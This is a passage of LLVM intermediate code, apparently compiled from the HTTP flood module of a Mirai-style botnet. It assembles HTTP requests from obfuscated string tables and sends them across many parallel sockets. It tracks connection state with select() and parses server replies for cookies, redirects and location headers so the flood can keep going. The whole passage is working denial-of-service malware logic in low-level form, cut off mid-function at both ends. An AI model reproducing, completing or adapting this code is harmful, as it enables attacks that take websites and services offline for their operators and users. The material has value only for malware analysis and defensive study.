  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %232
  %234 = call i32 @util_strcpy(i8* %233, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  call void @table_unlock_val(i8 zeroext 48) #7
  %235 = call i32 @util_strlen(i8* nonnull %61) #7
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %236
  %238 = call i8* @table_retrieve_val(i32 48, i32* null) #7
  %239 = call i32 @util_strcpy(i8* %237, i8* %238) #7
  call void @table_lock_val(i8 zeroext 48) #7
  %240 = call i32 @util_strlen(i8* nonnull %61) #7
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %241
  %243 = call i32 @util_strcpy(i8* %242, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  call void @table_unlock_val(i8 zeroext 49) #7
  %244 = call i32 @util_strlen(i8* nonnull %61) #7
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %245
  %247 = call i8* @table_retrieve_val(i32 49, i32* null) #7
  %248 = call i32 @util_strcpy(i8* %246, i8* %247) #7
  call void @table_lock_val(i8 zeroext 49) #7
  %249 = call i32 @util_strlen(i8* nonnull %61) #7
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %250
  %252 = call i32 @util_strcpy(i8* %251, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  call void @table_unlock_val(i8 zeroext 50) #7
  %253 = call i32 @util_strlen(i8* nonnull %61) #7
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %254
  %256 = call i8* @table_retrieve_val(i32 50, i32* null) #7
  %257 = call i32 @util_strcpy(i8* %255, i8* %256) #7
  call void @table_lock_val(i8 zeroext 50) #7
  %258 = call i32 @util_strlen(i8* nonnull %61) #7
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %259
  %261 = call i32 @util_strcpy(i8* %260, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br i1 %62, label %262, label %290

; <label>:262:                                    ; preds = %194
  call void @table_unlock_val(i8 zeroext 51) #7
  %263 = call i32 @util_strlen(i8* nonnull %61) #7
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %264
  %266 = call i8* @table_retrieve_val(i32 51, i32* null) #7
  %267 = call i32 @util_strcpy(i8* %265, i8* %266) #7
  call void @table_lock_val(i8 zeroext 51) #7
  %268 = call i32 @util_strlen(i8* nonnull %61) #7
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %269
  %271 = call i32 @util_strcpy(i8* %270, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  %272 = call i32 @util_strlen(i8* nonnull %61) #7
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %273
  %275 = call i8* @table_retrieve_val(i32 56, i32* null) #7
  %276 = call i32 @util_strcpy(i8* %274, i8* %275) #7
  %277 = call i32 @util_strlen(i8* nonnull %61) #7
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %278
  %280 = call i32 @util_strcpy(i8* %279, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i64 0, i64 0)) #7
  %281 = call i32 @util_strlen(i8* nonnull %14) #7
  %282 = call i32 @util_strlen(i8* nonnull %61) #7
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %283
  %285 = call i8* @util_itoa(i32 %281, i32 10, i8* %284) #7
  %286 = call i32 @util_strlen(i8* nonnull %61) #7
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %287
  %289 = call i32 @util_strcpy(i8* %288, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br label %290

; <label>:290:                                    ; preds = %262, %194
  %291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 15
  %292 = load i32, i32* %291, align 4
  %293 = icmp sgt i32 %292, 0
  br i1 %293, label %294, label %321

; <label>:294:                                    ; preds = %290
  %295 = call i32 @util_strlen(i8* nonnull %61) #7
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %296
  %298 = call i32 @util_strcpy(i8* %297, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0)) #7
  store i32 0, i32* %5, align 4
  %299 = load i32, i32* %291, align 4
  %300 = icmp sgt i32 %299, 0
  %301 = call i32 @util_strlen(i8* nonnull %61) #7
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %302
  br i1 %300, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %294
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %304 = phi i8* [ %319, %.lr.ph ], [ %303, %.lr.ph.preheader ]
  %305 = load i32, i32* %5, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 16, i64 %306, i64 0
  %308 = call i32 @util_strcpy(i8* %304, i8* %307) #7
  %309 = call i32 @util_strlen(i8* nonnull %61) #7
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %310
  %312 = call i32 @util_strcpy(i8* %311, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0)) #7
  %313 = load i32, i32* %5, align 4
  %314 = add nsw i32 %313, 1
  store i32 %314, i32* %5, align 4
  %315 = load i32, i32* %291, align 4
  %316 = icmp slt i32 %314, %315
  %317 = call i32 @util_strlen(i8* nonnull %61) #7
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %318
  br i1 %316, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %294
  %.lcssa = phi i8* [ %303, %294 ], [ %319, %._crit_edge.loopexit ]
  %320 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br label %321

; <label>:321:                                    ; preds = %._crit_edge, %290
  %322 = call i32 @util_strlen(i8* nonnull %61) #7
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %323
  %325 = call i32 @util_strcpy(i8* %324, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br i1 %62, label %326, label %331

; <label>:326:                                    ; preds = %321
  %327 = call i32 @util_strlen(i8* nonnull %61) #7
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %328
  %330 = call i32 @util_strcpy(i8* %329, i8* nonnull %14) #7
  br label %331

; <label>:331:                                    ; preds = %326, %321
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 10, i64 0
  %333 = call signext i8 @util_strcmp(i8* nonnull %202, i8* %332) #7
  %334 = icmp eq i8 %333, 0
  br i1 %334, label %335, label %337

; <label>:335:                                    ; preds = %331
  %336 = call i32 @util_strcpy(i8* nonnull %202, i8* %332) #7
  br label %337

; <label>:337:                                    ; preds = %331, %335
  %338 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %339 = load i32, i32* %338, align 4
  %340 = call i32 @util_strlen(i8* nonnull %61) #7
  %341 = sext i32 %340 to i64
  %342 = call i64 @send(i32 %339, i8* nonnull %61, i64 %341, i32 16384) #7
  %343 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 3
  store i32 %127, i32* %343, align 4
  store i8 6, i8* %131, align 4
  %344 = load i32, i32* %338, align 4
  %345 = srem i32 %344, 64
  %346 = zext i32 %345 to i64
  %347 = shl i64 1, %346
  %348 = sdiv i32 %344, 64
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %349
  %351 = load i64, i64* %350, align 8
  %352 = or i64 %347, %351
  store i64 %352, i64* %350, align 8
  %353 = icmp sgt i32 %344, %.0530612
  %354 = add nsw i32 %344, 1
  %..0530551 = select i1 %353, i32 %354, i32 %.0530612
  br label %398

; <label>:355:                                    ; preds = %138
  %356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %357 = load i32, i32* %356, align 4
  %358 = srem i32 %357, 64
  %359 = zext i32 %358 to i64
  %360 = shl i64 1, %359
  %361 = sdiv i32 %357, 64
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %362
  %364 = load i64, i64* %363, align 8
  %365 = or i64 %360, %364
  store i64 %365, i64* %363, align 8
  %366 = icmp sgt i32 %357, %.0530612
  %367 = add nsw i32 %357, 1
  %..0530552 = select i1 %366, i32 %367, i32 %.0530612
  br label %398

; <label>:368:                                    ; preds = %138
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %370 = load i32, i32* %369, align 4
  %371 = srem i32 %370, 64
  %372 = zext i32 %371 to i64
  %373 = shl i64 1, %372
  %374 = sdiv i32 %370, 64
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %375
  %377 = load i64, i64* %376, align 8
  %378 = or i64 %373, %377
  store i64 %378, i64* %376, align 8
  %379 = icmp sgt i32 %370, %.0530612
  %380 = add nsw i32 %370, 1
  %..0530553 = select i1 %379, i32 %380, i32 %.0530612
  br label %398

; <label>:381:                                    ; preds = %138
  %382 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %383 = load i32, i32* %382, align 4
  %384 = srem i32 %383, 64
  %385 = zext i32 %384 to i64
  %386 = shl i64 1, %385
  %387 = sdiv i32 %383, 64
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %388
  %390 = load i64, i64* %389, align 8
  %391 = or i64 %386, %390
  store i64 %391, i64* %389, align 8
  %392 = icmp sgt i32 %383, %.0530612
  %393 = add nsw i32 %383, 1
  %..0530554 = select i1 %392, i32 %393, i32 %.0530612
  br label %398

; <label>:394:                                    ; preds = %138
  store i8 0, i8* %131, align 4
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %396 = load i32, i32* %395, align 4
  %397 = call i32 @close(i32 %396) #7
  store i32 -1, i32* %395, align 4
  br label %398

; <label>:398:                                    ; preds = %381, %368, %355, %337, %181, %149, %394, %146, %177
  %.1531 = phi i32 [ %.0530612, %146 ], [ %.0530612, %177 ], [ %.0530612, %394 ], [ %..0530, %149 ], [ %..0530550, %181 ], [ %..0530551, %337 ], [ %..0530552, %355 ], [ %..0530553, %368 ], [ %..0530554, %381 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %399 = icmp slt i64 %indvars.iv.next, %48
  br i1 %399, label %.lr.ph615, label %._crit_edge616

._crit_edge616:                                   ; preds = %398
  %400 = icmp eq i32 %.1531, 0
  br i1 %400, label %.backedge596.backedge, label %401

.backedge596.backedge:                            ; preds = %._crit_edge616, %401, %.backedge596, %.backedge596.loopexit
  br label %.backedge596

; <label>:401:                                    ; preds = %._crit_edge616
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %9, align 16
  %402 = call i32 @select(i32 %.1531, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #7
  %403 = call i64 @time(i64* null) #7
  %404 = trunc i64 %403 to i32
  %405 = icmp slt i32 %402, 1
  %brmerge = or i1 %405, %.not
  br i1 %brmerge, label %.backedge596.backedge, label %.lr.ph633.preheader

.lr.ph633.preheader:                              ; preds = %401
  br label %.lr.ph633

.lr.ph633:                                        ; preds = %.lr.ph633.preheader, %.loopexit591
  %indvars.iv659 = phi i64 [ %indvars.iv.next660, %.loopexit591 ], [ 0, %.lr.ph633.preheader ]
  %406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 0
  %407 = load i32, i32* %406, align 4
  %408 = icmp eq i32 %407, -1
  br i1 %408, label %.loopexit591, label %409

; <label>:409:                                    ; preds = %.lr.ph633
  %410 = sdiv i32 %407, 64
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %411
  %413 = load i64, i64* %412, align 8
  %414 = srem i32 %407, 64
  %415 = zext i32 %414 to i64
  %416 = shl i64 1, %415
  %417 = and i64 %413, %416
  %418 = icmp eq i64 %417, 0
  br i1 %418, label %430, label %419

; <label>:419:                                    ; preds = %409
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %420 = call i32 @getsockopt(i32 %407, i32 1, i32 4, i8* nonnull %63, i32* nonnull %13) #7
  %421 = load i32, i32* %12, align 4
  %422 = or i32 %421, %420
  %423 = icmp eq i32 %422, 0
  br i1 %423, label %424, label %426

; <label>:424:                                    ; preds = %419
  %425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 4, i8* %425, align 4
  %.pre663 = load i32, i32* %406, align 4
  br label %430

; <label>:426:                                    ; preds = %419
  %427 = load i32, i32* %406, align 4
  %428 = call i32 @close(i32 %427) #7
  store i32 -1, i32* %406, align 4
  %429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 0, i8* %429, align 4
  br label %.loopexit591

; <label>:430:                                    ; preds = %409, %424
  %431 = phi i32 [ %407, %409 ], [ %.pre663, %424 ]
  %432 = sdiv i32 %431, 64
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %433
  %435 = load i64, i64* %434, align 8
  %436 = srem i32 %431, 64
  %437 = zext i32 %436 to i64
  %438 = shl i64 1, %437
  %439 = and i64 %438, %435
  %440 = icmp eq i64 %439, 0
  br i1 %440, label %.loopexit591, label %441

; <label>:441:                                    ; preds = %430
  %442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  %443 = load i8, i8* %442, align 4
  switch i8 %443, label %.loopexit591 [
    i8 6, label %452
    i8 7, label %.preheader590
    i8 10, label %.preheader592.preheader
  ]

.preheader592.preheader:                          ; preds = %441
  br label %.preheader592

.preheader590:                                    ; preds = %441
  %444 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 17
  %445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 0
  %446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 64
  %447 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 2
  %448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  %449 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  %450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  br label %907

; <label>:452:                                    ; preds = %441
  call void @util_zero(i8* nonnull %21, i32 10240) #7
  %453 = load i32, i32* %406, align 4
  %454 = call i64 @recv(i32 %453, i8* nonnull %21, i64 10240, i32 16386) #7
  %455 = trunc i64 %454 to i32
  %456 = icmp slt i32 %455, 1
  br i1 %456, label %457, label %460

; <label>:457:                                    ; preds = %452
  %458 = load i32, i32* %406, align 4
  %459 = call i32 @close(i32 %458) #7
  store i32 -1, i32* %406, align 4
  store i8 0, i8* %442, align 4
  br label %.loopexit591

; <label>:460:                                    ; preds = %452
  %461 = call i32 @util_memsearch(i8* nonnull %21, i32 %455, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4) #7
  %462 = icmp eq i32 %461, -1
  %463 = icmp slt i32 %455, 10240
  %or.cond5 = and i1 %463, %462
  br i1 %or.cond5, label %.loopexit591, label %464

; <label>:464:                                    ; preds = %460
  %465 = call i32 @util_memsearch(i8* nonnull %21, i32 %455, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4) #7
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %466
  store i8 0, i8* %467, align 1
  %468 = call i8* @table_retrieve_val(i32 62, i32* null) #7
  %469 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %468) #7
  %470 = icmp eq i32 %469, -1
  br i1 %470, label %473, label %471

; <label>:471:                                    ; preds = %464
  %472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 2, i32* %472, align 4
  br label %473

; <label>:473:                                    ; preds = %464, %471
  %474 = call i8* @table_retrieve_val(i32 61, i32* null) #7
  %475 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %474) #7
  %476 = icmp eq i32 %475, -1
  br i1 %476, label %479, label %477

; <label>:477:                                    ; preds = %473
  %478 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 1, i32* %478, align 4
  br label %479

; <label>:479:                                    ; preds = %473, %477
  %480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 12
  store i32 0, i32* %480, align 4
  %481 = call i8* @table_retrieve_val(i32 60, i32* null) #7
  %482 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %481) #7
  %483 = icmp eq i32 %482, -1
  br i1 %483, label %508, label %484

; <label>:484:                                    ; preds = %479
  %485 = call i8* @table_retrieve_val(i32 60, i32* null) #7
  %486 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %485) #7
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %487
  %489 = load i8, i8* %488, align 1
  %490 = icmp eq i8 %489, 32
  %491 = zext i1 %490 to i32
  %.555 = add nsw i32 %491, %486
  %492 = sext i32 %.555 to i64
  %493 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %492
  %494 = sub nsw i32 %455, %.555
  %495 = call i32 @util_memsearch(i8* %493, i32 %494, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %496 = icmp eq i32 %495, -1
  br i1 %496, label %508, label %497

; <label>:497:                                    ; preds = %484
  %498 = icmp sgt i32 %495, 1
  %499 = add nsw i32 %495, -2
  %.556 = select i1 %498, i32 %499, i32 %495
  %500 = add nsw i32 %.555, %.556
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %501
  store i8 0, i8* %502, align 1
  %503 = call i32 @util_strlen(i8* %493) #7
  %504 = call i8* @table_retrieve_val(i32 59, i32* null) #7
  %505 = call i32 @util_stristr(i8* %493, i32 %503, i8* %504) #7
  %506 = icmp eq i32 %505, 0
  br i1 %506, label %508, label %507

; <label>:507:                                    ; preds = %497
  store i32 1, i32* %480, align 4
  br label %508

; <label>:508:                                    ; preds = %497, %484, %479, %507
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  store i32 0, i32* %509, align 4
  %510 = call i8* @table_retrieve_val(i32 57, i32* null) #7
  %511 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %510) #7
  %512 = icmp eq i32 %511, -1
  br i1 %512, label %537, label %513

; <label>:513:                                    ; preds = %508
  %514 = call i8* @table_retrieve_val(i32 57, i32* null) #7
  %515 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %514) #7
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %516
  %518 = load i8, i8* %517, align 1
  %519 = icmp eq i8 %518, 32
  %520 = zext i1 %519 to i32
  %.557 = add nsw i32 %520, %515
  %521 = sext i32 %.557 to i64
  %522 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %521
  %523 = sub nsw i32 %455, %.557
  %524 = call i32 @util_memsearch(i8* %522, i32 %523, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %525 = icmp eq i32 %524, -1
  br i1 %525, label %537, label %526

; <label>:526:                                    ; preds = %513
  %527 = icmp sgt i32 %524, 1
  %528 = add nsw i32 %524, -2
  %.558 = select i1 %527, i32 %528, i32 %524
  %529 = add nsw i32 %.557, %.558
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %530
  store i8 0, i8* %531, align 1
  %532 = call i32 @util_strlen(i8* %522) #7
  %533 = call i8* @table_retrieve_val(i32 58, i32* null) #7
  %534 = call i32 @util_stristr(i8* %522, i32 %532, i8* %533) #7
  %535 = icmp eq i32 %534, 0
  br i1 %535, label %537, label %536

; <label>:536:                                    ; preds = %526
  store i32 1, i32* %509, align 4
  br label %537

; <label>:537:                                    ; preds = %526, %513, %508, %536
  %538 = call i8* @table_retrieve_val(i32 56, i32* null) #7
  %539 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %538) #7
  %540 = icmp eq i32 %539, -1
  br i1 %540, label %.sink.split, label %541

; <label>:541:                                    ; preds = %537
  %542 = call i8* @table_retrieve_val(i32 56, i32* null) #7
  %543 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %542) #7
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %544
  %546 = load i8, i8* %545, align 1
  %547 = icmp eq i8 %546, 32
  %548 = zext i1 %547 to i32
  %.559 = add nsw i32 %548, %543
  %549 = sext i32 %.559 to i64
  %550 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %549
  %551 = sub nsw i32 %455, %.559
  %552 = call i32 @util_memsearch(i8* %550, i32 %551, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %553 = icmp eq i32 %552, -1
  br i1 %553, label %.preheader589, label %554

; <label>:554:                                    ; preds = %541
  %555 = icmp sgt i32 %552, 1
  %556 = add nsw i32 %552, -2
  %.560 = select i1 %555, i32 %556, i32 %552
  %557 = add nsw i32 %.559, %.560
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %558
  store i8 0, i8* %559, align 1
  %560 = call i32 @util_atoi(i8* %550, i32 10) #7
  br label %.sink.split

.sink.split:                                      ; preds = %537, %554
  %.sink6 = phi i32 [ %560, %554 ], [ 0, %537 ]
  %561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  store i32 %.sink6, i32* %561, align 4
  br label %.preheader589

.preheader589:                                    ; preds = %541, %.sink.split
  %562 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  %563 = call i8* @table_retrieve_val(i32 55, i32* null) #7
  %564 = call i32 @util_stristr(i8* nonnull %21, i32 %455, i8* %563) #7
  %565 = icmp eq i32 %564, -1
  br i1 %565, label %.critedge561, label %.lr.ph625.preheader

.lr.ph625.preheader:                              ; preds = %.preheader589
  br label %.lr.ph625

.lr.ph625:                                        ; preds = %.lr.ph625.preheader, %.loopexit
  %566 = phi i8* [ %.pre669, %.loopexit ], [ %21, %.lr.ph625.preheader ]
  %.0539624 = phi i32 [ %.pre666, %.loopexit ], [ 0, %.lr.ph625.preheader ]
  %567 = load i32, i32* %562, align 4
  %568 = icmp slt i32 %567, 5
  br i1 %568, label %569, label %.critedge561.loopexit

; <label>:569:                                    ; preds = %.lr.ph625
  %570 = call i8* @table_retrieve_val(i32 55, i32* null) #7
  %571 = call i32 @util_stristr(i8* %566, i32 %455, i8* %570) #7
  %572 = add nsw i32 %571, %.0539624
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %573
  %575 = load i8, i8* %574, align 1
  %576 = icmp eq i8 %575, 32
  %577 = zext i1 %576 to i32
  %.562 = add nsw i32 %577, %571
  %578 = sext i32 %.562 to i64
  %579 = getelementptr inbounds i8, i8* %566, i64 %578
  %580 = sub nsw i32 %455, %.0539624
  %581 = sub i32 %580, %.562
  %582 = call i32 @util_memsearch(i8* %579, i32 %581, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %583 = icmp eq i32 %582, -1
  %.pre666 = add nsw i32 %.562, %.0539624
  %.pre667 = sext i32 %.pre666 to i64
  %.pre669 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %.pre667
  br i1 %583, label %.loopexit, label %584

; <label>:584:                                    ; preds = %569
  %585 = icmp sgt i32 %582, 1
  %586 = add nsw i32 %582, -2
  %.563 = select i1 %585, i32 %586, i32 %582
  %587 = call i32 @util_memsearch(i8* %579, i32 %581, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i64 0, i64 0), i32 1) #7
  %588 = icmp sgt i32 %587, 0
  br i1 %588, label %589, label %592

; <label>:589:                                    ; preds = %584
  %590 = call i32 @util_memsearch(i8* %579, i32 %581, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i64 0, i64 0), i32 1) #7
  %591 = add nsw i32 %590, -1
  br label %592

; <label>:592:                                    ; preds = %589, %584
  %.1533 = phi i32 [ %591, %589 ], [ %.563, %584 ]
  %593 = add nsw i32 %.1533, %.pre666
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %594
  store i8 0, i8* %595, align 1
  store i32 0, i32* %5, align 4
  %596 = call i32 @util_strlen(i8* nonnull %.pre669) #7
  %597 = icmp sgt i32 %596, 0
  br i1 %597, label %.lr.ph619.preheader, label %._crit_edge620

.lr.ph619.preheader:                              ; preds = %592
  br label %.lr.ph619

; <label>:598:                                    ; preds = %.lr.ph619
  store i32 %606, i32* %5, align 4
  %599 = call i32 @util_strlen(i8* nonnull %.pre669) #7
  %600 = icmp slt i32 %606, %599
  br i1 %600, label %.lr.ph619, label %._crit_edge620.loopexit

.lr.ph619:                                        ; preds = %.lr.ph619.preheader, %598
  %601 = load i32, i32* %5, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds i8, i8* %.pre669, i64 %602
  %604 = load i8, i8* %603, align 1
  %605 = icmp eq i8 %604, 61
  %606 = add nsw i32 %601, 1
  br i1 %605, label %._crit_edge620.loopexit, label %598

._crit_edge620.loopexit:                          ; preds = %.lr.ph619, %598
  br label %._crit_edge620

._crit_edge620:                                   ; preds = %._crit_edge620.loopexit, %592
  %607 = load i32, i32* %5, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds i8, i8* %.pre669, i64 %608
  %610 = load i8, i8* %609, align 1
  %611 = icmp eq i8 %610, 61
  br i1 %611, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge620
  store i32 0, i32* %5, align 4
  %612 = load i32, i32* %562, align 4
  %613 = icmp sgt i32 %612, 0
  br i1 %613, label %.lr.ph623.preheader, label %.critedge564

.lr.ph623.preheader:                              ; preds = %.preheader
  br label %.lr.ph623

.lr.ph623:                                        ; preds = %.lr.ph623.preheader, %618
  %storemerge547622 = phi i32 [ %620, %618 ], [ 0, %.lr.ph623.preheader ]
  %614 = sext i32 %storemerge547622 to i64
  %615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %614, i64 0
  %616 = call signext i8 @util_strncmp(i8* %.pre669, i8* %615, i32 %607) #7
  %617 = icmp eq i8 %616, 0
  br i1 %617, label %618, label %.loopexit.loopexit

; <label>:618:                                    ; preds = %.lr.ph623
  %619 = load i32, i32* %5, align 4
  %620 = add nsw i32 %619, 1
  store i32 %620, i32* %5, align 4
  %621 = load i32, i32* %562, align 4
  %622 = icmp slt i32 %620, %621
